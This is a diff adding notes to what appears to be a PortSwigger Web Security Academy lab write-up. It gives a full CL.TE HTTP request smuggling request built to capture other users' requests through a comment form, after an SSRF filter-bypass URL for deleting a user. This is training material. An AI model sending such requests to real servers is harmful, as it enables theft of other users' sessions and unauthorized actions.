@@ -40,3 +40,30 @@ Write this payload into comment section:
 ```
 http://127.1/%2561dmin/delete?username=carlos
 ```
+
+# [0x5] Lab: Exploiting HTTP request smuggling to capture other users' requests
+
+Send this request to repeater and with HTTP Request Smuggler extension CL.TE send the requests a lot of times till the victim user visit our post requests
+```
+POST / HTTP/1.1
+Host: 0ac3003b03f25372c05c3a6500550078.web-security-academy.net
+Cookie: session=T4wowDw3zijv7BtCJopH8kzeW8ur458c
+Cache-Control: max-age=0
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="96"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Connection: close
+Transfer-Encoding: chunked
+Content-Length: 382
+
+0
+
+POST /post/comment HTTP/1.1
+Host: 0ac3003b03f25372c05c3a6500550078.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 910
+Cookie: session=T4wowDw3zijv7BtCJopH8kzeW8ur458c
+
+csrf=OFh9DBRBkec4d8Xmh2rzVGNUZuDZlbH0&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=aa
+```
